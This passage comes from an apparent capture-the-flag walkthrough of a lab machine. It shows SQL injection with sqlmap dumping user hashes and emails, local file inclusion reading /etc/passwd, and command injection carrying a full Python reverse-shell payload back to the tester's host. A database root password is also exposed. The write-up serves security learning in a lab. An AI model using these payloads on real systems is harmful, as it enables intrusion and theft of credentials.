</span><span class='line'>                    <span class="ni">&amp;lt;</span>p<span class="ni">&amp;gt;&amp;lt;</span>h3<span class="ni">&amp;gt;</span>There is long way to go :-) <span class="ni">&amp;lt;</span>a href=&quot;hacked.php&quot;<span class="ni">&amp;gt;</span>Click Here to Proceed Further<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span>.<span class="ni">&amp;lt;</span>/h3<span class="ni">&amp;gt;&amp;lt;</span>/p<span class="ni">&amp;gt;</span>
</span><span class='line'>
</span><span class='line'>                    <span class="ni">&amp;lt;</span>p<span class="ni">&amp;gt;&amp;lt;</span>h3<span class="ni">&amp;gt;</span>If you are done, please <span class="ni">&amp;lt;</span>a href=&quot;includes/logout.php&quot;<span class="ni">&amp;gt;</span>log out<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span>.<span class="ni">&amp;lt;</span>/h3<span class="ni">&amp;gt;&amp;lt;</span>/p<span class="ni">&amp;gt;</span>
</span><span class='line'>
</span><span class='line'>                        <span class="ni">&amp;lt;</span>/body<span class="ni">&amp;gt;</span>
</span><span class='line'><span class="nt">&lt;/code&gt;&lt;/pre&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;&lt;/html&gt;</span>
</span><span class='line'>..
</span></code></pre></td></tr></table></div></figure></p>

<p>Proceeding further, there are a few hints for sql injection, but nothing that we have tried worked:
<a href="http://192.168.80.158:33447/Challenge/hacked.php?id=33&amp;add=Add+ID">http://192.168.80.158:33447/Challenge/hacked.php?id=33&amp;add=Add+ID</a></p>

<p>Trying sqlmap or manual identification was without success, however Burp
Suite Scanner revealed, that the parameter ID is vulnerable, when it&rsquo;s sent in POST
method:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>POST /Challenge/hacked.php?add=Add_ID HTTP/1.1
</span><span class='line'>Host: 192.168.80.158:33447
</span><span class='line'>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<span class="nt">&lt;em&gt;</span>/<span class="nt">&lt;/em&gt;</span>;q=0.8
</span><span class='line'>Accept-Language: en-US,en;q=0.5
</span><span class='line'>Accept-Encoding: gzip, deflate
</span><span class='line'>DNT: 1
</span><span class='line'>Referer: <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://192.168.80.158:33447/Challenge/hacked.php&quot;</span><span class="nt">&gt;</span>http://192.168.80.158:33447/Challenge/hacked.php<span class="nt">&lt;/a&gt;</span>
</span><span class='line'>Cookie: sec_session_id=1mo7qhj43ul3d90kin24am4531
</span><span class='line'>Connection: keep-alive
</span><span class='line'>Content-Type: application/x-www-form-urlencoded
</span><span class='line'>Content-Length: 28<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>id=1&#39;
</span><span class='line'><span class="ni">&amp;hellip;</span><span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>Could not enter data: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near <span class="ni">&amp;lsquo;</span>&#39;1<span class="ni">&amp;rsquo;&amp;lsquo;</span>))<span class="ni">&amp;rsquo;</span> at line
</span></code></pre></td></tr></table></div></figure></p>

<p>Now we can use sqlmap and retrieve some useful information:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# sqlmap -u &ldquo;&lt;a href="http://192.168.80.158:33447/Challenge/hacked.php?add=Add+ID">http://192.168.80.158:33447/Challenge/hacked.php?add=Add+ID&lt;/a>&rdquo; &ndash;cookie=&ldquo;sec_session_id=1mo7qhj43ul3d90kin24am4531&rdquo; -p id &ndash;method=POST &ndash;data=&ldquo;id=1&rdquo; -a
</span><span class='line'>&hellip;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>web server operating system: Linux Ubuntu
</span><span class='line'>web application technology: Apache 2.4.10
</span><span class='line'>back-end DBMS operating system: Linux Ubuntu
</span><span class='line'>back-end DBMS: MySQL 5.0
</span><span class='line'>banner:    &lsquo;5.6.25-0ubuntu0.15.04.1&rsquo;
</span><span class='line'>current user:    &lsquo;root@localhost&rsquo;
</span><span class='line'>current database:    &lsquo;secure_login&rsquo;
</span><span class='line'>hostname:    &lsquo;acid&rsquo;
</span><span class='line'>current user is DBA:    True&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~# sqlmap -u &ldquo;&lt;a href="http://192.168.80.158:33447/Challenge/hacked.php?add=Add+ID">http://192.168.80.158:33447/Challenge/hacked.php?add=Add+ID&lt;/a>&rdquo; &ndash;cookie=&ldquo;sec_session_id=1mo7qhj43ul3d90kin24am4531&rdquo; -p id &ndash;method=POST &ndash;data=&ldquo;id=1&rdquo;  -D secure_login &ndash;tables &ndash;columns &ndash;dump&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# cat success.csv
</span><span class='line'>id,VXNlcnMudHh0,Y0dGemN5NTBlSFE9
</span><span class='line'>1,lol,lol1&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# echo VXNlcnMudHh0 | base64 -d
</span><span class='line'>Users.txt&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# echo Y0dGemN5NTBlSFE9 | base64 -d
</span><span class='line'>cGFzcy50eHQ=&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# echo cGFzcy50eHQ= | base64 -d
</span><span class='line'>pass.txt&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# cat members.csv
</span><span class='line'>id,salt,email,username,password
</span><span class='line'>1,f9aab579fc1b41ed0c44fe4ecdbfcdb4cb99b9023abb241a6db833288f4eea3c02f76e0d35204a8695077dcf81932aa59006423976224be0390395bae152d4ef,test@example.com,test_user,00807432eae173f652f2064bdca1b61b290b52d40e429a7d295d76a71084aa96c0233b82f1feac45529e0726559645acaed6f3ae58a286b9f075916ebf66cacc
</span><span class='line'>2,8a93f1fa3259a90d9cfafcc1ef43dfc2d0a2d6cba0e8f2f9c23ae6b701364aa278bf5629585c3663ae3df5c7a3734ca6af4019d7ef897f45cb0acc056c3e735f,acid@gmail.com,Acid,53b9bd4416ec581838c4bde217e09f1206b94cdb95475cddda862894f4dbbeec5ceacc2e116a64cb56d8384404738c5fd16478e0266962eeb3b61da1918d5931
</span><span class='line'>3,be02c5499ba4fd559dc7809a7fae01d6f251e781dbdf5a7af2c7bca320006f1a5275d8020d5c539d116e54b1bf775018349c721151d9111ad1c3da8f6b9c9697,saman.j.l33t@gmail.com,saman,c124191d7a267cb2b83b2c59a30b2e388b77f13955340015462bffc0d90cfa7b402ecb8e3fc82717f22b127c98a4afa9ed4f3661d824c6c57a1490f9963d9234
</span><span class='line'>4,c72ccb8eb5ac065eca5341ff8ed296648b92bc99b511300a4525e8c17679ecce06e8038e582b539acf17008f9fd3a394d912f1158ef7f3d16d5f66ba32ca18bb,vik.create@gmail.com,Vivek,fb8db054a75254633052d951002065109cd96fe990bf5a5d5bd1581d3578235a69224784b29870046d21d95567cdfe292221fbabce17201b23ca0fd5ee4fa20e</span></code></pre></td></tr></table></div></figure></p>

<p>Because the hashes are salted SHA512, it was not reasonable to crack them. Instead, using google we found the hashes from test_user <a href="http://www.wikihow.com/Create-a-Secure-Login-Script-in-PHP-and-MySQL">here</a>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Username: test_user
</span><span class='line'>Email: &lt;a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#x3a;&#x74;&#x65;&#x73;&#x74;&#64;&#101;&#120;&#x61;&#109;&#112;&#108;&#101;&#x2e;&#99;&#111;&#x6d;">&#x74;&#x65;&#x73;&#116;&#64;&#101;&#120;&#x61;&#109;&#x70;&#x6c;&#x65;&#46;&#x63;&#111;&#109;&lt;/a>
</span><span class='line'>Password: 6ZaxN2Vzm9NUJT2y</span></code></pre></td></tr></table></div></figure></p>

<p>We log in and proceed to the text step:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.80.158:33447/Challenge/">http://192.168.80.158:33447/Challenge/&lt;/a>
</span><span class='line'>&lt;a href="http://192.168.80.158:33447/Challenge/include.php">http://192.168.80.158:33447/Challenge/include.php&lt;/a></span></code></pre></td></tr></table></div></figure></p>

<p>There was <code>&lt;!--0x5933566a4c6e4a34626e413d--&gt;</code> on the page, that means after hex/base64/rot13/reverse <code>cake.php</code>.</p>

<p>We identified LFI:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /Challenge/include.php?file=/etc/passwd&amp;add=Extract+File HTTP/1.1
</span><span class='line'>Host: 192.168.80.158:33447
</span><span class='line'>Accept-Language: en-US,en;q=0.5
</span><span class='line'>Accept-Encoding: gzip, deflate
</span><span class='line'>DNT: 1
</span><span class='line'>Referer: &lt;a href="http://192.168.80.158:33447/Challenge/include.php">http://192.168.80.158:33447/Challenge/include.php&lt;/a>
</span><span class='line'>Cookie: sec_session_id=f1c3r9m5ud1pdctd6efvgu7ti6
</span><span class='line'>Connection: keep-alive&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&hellip;
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span><span class='line'>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span><span class='line'>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span><span class='line'>&lt;a href="news:x:9:9:news:/var/spool/news:/usr/sbin/nologin">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&lt;/a>
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span><span class='line'>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span><span class='line'>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span><span class='line'>systemd-timesync:x:100:104:systemd Time Synchronization,,,:/run/systemd:/bin/false
</span><span class='line'>systemd-network:x:101:105:systemd Network Management,,,:/run/systemd/netif:/bin/false
</span><span class='line'>systemd-resolve:x:102:106:systemd Resolver,,,:/run/systemd/resolve:/bin/false
</span><span class='line'>systemd-bus-proxy:x:103:107:systemd Bus Proxy,,,:/run/systemd:/bin/false
</span><span class='line'>syslog:x:104:110::/home/syslog:/bin/false
</span><span class='line'>messagebus:x:105:112::/var/run/dbus:/bin/false
</span><span class='line'>uuidd:x:106:113::/run/uuidd:/bin/false
</span><span class='line'>dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/bin/false
</span><span class='line'>ntp:x:108:117::/home/ntp:/bin/false
</span><span class='line'>whoopsie:x:109:118::/nonexistent:/bin/false
</span><span class='line'>acid:x:1000:1000:acid,,,:/home/acid:/bin/bash
</span><span class='line'>mysql:x:111:126:MySQL Server,,,:/nonexistent:/bin/false
</span><span class='line'>saman:x:1001:1001:,,,:/home/saman:/bin/bash</span></code></pre></td></tr></table></div></figure></p>

<p><a href="http://192.168.80.158:33447/Challenge/cake.php">http://192.168.80.158:33447/Challenge/cake.php</a> shows also the <a href="http://192.168.80.158:33447/Challenge/Magic_Box/">http://192.168.80.158:33447/Challenge/Magic_Box/</a> URL.</p>

<p>Dirb found <a href="http://192.168.80.158:33447/Challenge/Magic_Box/proc,">http://192.168.80.158:33447/Challenge/Magic_Box/proc,</a> where we put our next focus.</p>

<p>We wanted to hack the server using <code>/proc/self/environ</code> technique, but the server was a recent ubuntu version and we found only reference to session variable <a href="http://192.168.80.158:33447/Challenge/include.php?file=/proc/self/fd/14&amp;add=Extract+File">file</a>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.80.158:33447/Challenge/include.php?file=/proc/cmdline&amp;add=Extract+File">http://192.168.80.158:33447/Challenge/include.php?file=/proc/cmdline&amp;add=Extract+File&lt;/a>
</span><span class='line'>&lt;a href="http://192.168.80.158:33447/Challenge/include.php?file=/boot/config-3.19.0-15-generic&amp;add=Extract+File">http://192.168.80.158:33447/Challenge/include.php?file=/boot/config-3.19.0-15-generic&amp;add=Extract+File&lt;/a></span></code></pre></td></tr></table></div></figure></p>

<p>We gave up hacking via /proc, but dirb reveals another files:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# dirb &lt;a href="http://192.168.80.158:33447/Challenge/Magic_Box/">http://192.168.80.158:33447/Challenge/Magic_Box/&lt;/a>  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -X .html,.php,.ini,.txt,.inc,.zip,.bak,.rar,.xml -fw&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;p>DIRB v2.21&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h2>By The Dark Raver&lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;p>START_TIME: Wed Apr 29 18:52:56 2015
</span><span class='line'>URL_BASE: &lt;a href="http://192.168.80.158:33447/Challenge/Magic_Box/">http://192.168.80.158:33447/Challenge/Magic_Box/&lt;/a>
</span><span class='line'>WORDLIST_FILES: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span><span class='line'>OPTION: Fine tunning of NOT_FOUND detection
</span><span class='line'>OPTION: Not Stoping on warning messages
</span><span class='line'>EXTENSIONS_LIST: (.html,.php,.ini,.txt,.inc,.zip,.bak,.rar,.xml) | (.html)(.php)(.ini)(.txt)(.inc)(.zip)(.bak)(.rar)(.xml) [NUM = 9]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;p>GENERATED WORDS: 219174
</span><span class='line'>(!) WARNING: Wordlist is too large. This will take a long time to end.
</span><span class='line'>    (Use mode &lsquo;-w&rsquo; if you want to scan anyway)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&mdash;- Scanning URL: &lt;a href="http://192.168.80.158:33447/Challenge/Magic_Box/">http://192.168.80.158:33447/Challenge/Magic_Box/&lt;/a> &mdash;-
</span><span class='line'>+ &lt;a href="http://192.168.80.158:33447/Challenge/Magic_Box/low.php">http://192.168.80.158:33447/Challenge/Magic_Box/low.php&lt;/a> (CODE:200|SIZE:0)
</span><span class='line'>+ &lt;a href="http://192.168.80.158:33447/Challenge/Magic_Box/command.php">http://192.168.80.158:33447/Challenge/Magic_Box/command.php&lt;/a> (CODE:200|SIZE:54)
</span><span class='line'>+ &lt;a href="http://192.168.80.158:33447/Challenge/Magic_Box/tails.php">http://192.168.80.158:33447/Challenge/Magic_Box/tails.php&lt;/a> (CODE:200|SIZE:74)</span></code></pre></td></tr></table></div></figure></p>

<p>Now we understand from the index page the sentence <code>Fairy tails uses secret keys to open the magical doors.</code></p>

<p>Seems that we almost won, because RCE (OS Commanding) on <a href="http://192.168.80.158:33447/Challenge/Magic_Box/tails.php.">http://192.168.80.158:33447/Challenge/Magic_Box/tails.php.</a></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>POST /Challenge/Magic_Box/command.php HTTP/1.1
</span><span class='line'>Host: 192.168.80.158:33447
</span><span class='line'>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,&lt;em>/&lt;/em>;q=0.8
</span><span class='line'>Accept-Language: en-US,en;q=0.5
</span><span class='line'>Accept-Encoding: gzip, deflate
</span><span class='line'>DNT: 1
</span><span class='line'>Referer: &lt;a href="http://192.168.80.158:33447/Challenge/Magic_Box/command.php">http://192.168.80.158:33447/Challenge/Magic_Box/command.php&lt;/a>
</span><span class='line'>Cookie: sec_session_id=pieetao0om7q8pop7rgt3i45a2
</span><span class='line'>Connection: keep-alive
</span><span class='line'>Content-Type: application/x-www-form-urlencoded
</span><span class='line'>Content-Length: 29&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>IP=127.0.0.1;id&amp;submit=submit&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&hellip;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.013 ms
</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.017 ms
</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.016 ms&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&mdash; 127.0.0.1 ping statistics &mdash;
</span><span class='line'>3 packets transmitted, 3 received, 0% packet loss, time 1998ms
</span><span class='line'>rtt min/avg/max/mdev = 0.013/0.015/0.017/0.003 ms
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre></td></tr></table></div></figure></p>

<p>We realized after a few seconds, that there is no nc with executable property,
no curl, no wget and no writable place in DocumentRoot on obvious place, we tried
to store something to <code>/var/www/html/</code>. We could send anything over netcat, but
using python reverse shell could be more efficient:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nc -l -p 1337&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>POST /Challenge/Magic_Box/command.php HTTP/1.1
</span><span class='line'>Host: 192.168.80.158:33447
</span><span class='line'>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,&lt;em>/&lt;/em>;q=0.8
</span><span class='line'>Accept-Language: en-US,en;q=0.5
</span><span class='line'>Accept-Encoding: gzip, deflate
</span><span class='line'>DNT: 1
</span><span class='line'>Referer: &lt;a href="http://192.168.80.158:33447/Challenge/Magic_Box/command.php">http://192.168.80.158:33447/Challenge/Magic_Box/command.php&lt;/a>
</span><span class='line'>Cookie: sec_session_id=pieetao0om7q8pop7rgt3i45a2
</span><span class='line'>Connection: keep-alive
</span><span class='line'>Content-Type: application/x-www-form-urlencoded
</span><span class='line'>Content-Length: 101&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>IP=x ;python -c &lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&ldquo;192.168.80.137&rdquo;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&ldquo;/bin/sh&rdquo;,&ldquo;-i&rdquo;]);&rsquo;&amp;submit=submit</span></code></pre></td></tr></table></div></figure></p>

<p>We are connected and now we need to escalate our privileges. We found:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat psl-config.php
</span><span class='line'>&lt;?php
</span><span class='line'>define(&ldquo;HOST&rdquo;, &ldquo;localhost&rdquo;);                    // The host you want to connect to.
</span><span class='line'>define(&ldquo;USER&rdquo;, &ldquo;root&rdquo;);                         // The database username.
</span><span class='line'>define(&ldquo;PASSWORD&rdquo;, &ldquo;mehak&rdquo;);    // The database password.
</span><span class='line'>define(&ldquo;DATABASE&rdquo;, &ldquo;secure_login&rdquo;);             // The database name.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>www-data@acid:/$ find / -user acid 2>/dev/null
</span><span class='line'>/sbin/raw_vs_isi/hint.pcapng
</span><span class='line'>/bin/pwn_me
</span><span class='line'>/bin/pwn_me/chkrootkit.lsm
</span><span class='line'>/bin/pwn_me/chkrootkit
</span><span class='line'>/bin/pwn_me/README.chkwtmp
</span><span class='line'>/bin/pwn_me/ACKNOWLEDGMENTS
</span><span class='line'>/bin/pwn_me/chkdirs.c
</span><span class='line'>/bin/pwn_me/ifpromisc.c
</span><span class='line'>/bin/pwn_me/Makefile
</span><span class='line'>/bin/pwn_me/chklastlog.c
</span><span class='line'>/bin/pwn_me/strings.c
</span><span class='line'>/bin/pwn_me/chkwtmp.c
</span><span class='line'>/bin/pwn_me/README.chklastlog
</span><span class='line'>/bin/pwn_me/COPYRIGHT
</span><span class='line'>/bin/pwn_me/chkproc.c
</span><span class='line'>/bin/pwn_me/README
</span><span class='line'>/bin/pwn_me/chkutmp.c
</span><span class='line'>/bin/pwn_me/check_wtmpx.c
</span><span class='line'>/var/lib/lightdm-data/acid
</span><span class='line'>/var/www/html/Challenge/less
</span><span class='line'>/var/www/html/Challenge/less/style.less
</span><span class='line'>/var/www/html/Challenge/css
</span><span class='line'>/var/www/html/Challenge/css/style.css
</span><span class='line'>/var/www/html/Challenge/css/style.css.save
</span><span class='line'>/var/www/html/index.html
</span><span class='line'>/var/www/html/images
</span><span class='line'>/var/www/html/images/bg.jpg
</span><span class='line'>/var/www/html/images/Thumbs.db
</span><span class='line'>/var/www/html/images/wow.jpg
</span><span class='line'>/var/www/html/css
</span><span class='line'>/var/www/html/css/style.css
</span><span class='line'>/home/acid
</span><span class='line'>/home/acid/.xsession-errors.old
</span><span class='line'>/home/acid/Public
</span><span class='line'>/home/acid/.thumbnails
</span><span class='line'>/home/acid/Desktop
</span><span class='line'>/home/acid/.mozilla
</span><span class='line'>/home/acid/.gconf
</span><span class='line'>/home/acid/Videos
</span><span class='line'>/home/acid/Templates
</span><span class='line'>/home/acid/.config
</span><span class='line'>/home/acid/Music
</span><span class='line'>/home/acid/.profile
</span><span class='line'>/home/acid/.bashrc
</span><span class='line'>/home/acid/.sudo_as_admin_successful
</span><span class='line'>/home/acid/Downloads
